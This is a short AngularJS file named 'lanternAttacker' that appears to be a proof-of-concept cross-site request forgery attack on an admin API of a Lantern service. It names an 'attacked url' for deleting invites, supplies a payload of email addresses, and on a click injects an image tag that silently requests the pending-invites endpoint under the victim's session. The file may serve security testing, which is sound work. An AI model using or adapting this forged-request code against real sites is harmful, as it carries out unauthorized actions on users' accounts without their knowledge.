'use strict';

angular.module('lanternAttacker', [])
  .run(function ($rootScope, $window) {
    $window.$rootScope = $rootScope;
    $rootScope.url = 'https://pantsctrl.appspot.com/admin/rest/invites/delete'; // attacked url
    $rootScope.payload = ["lanternfriend@gmail.com\u0001lanternuser@gmail.com"];
  })
  .directive('fetchInvites', function () {
    return function (scope, element) {
      element.bind('click', function () {
        element.after('<img src="https://pantsctrl.appspot.com/admin/rest/invites/pending">');
      });
    };
  });
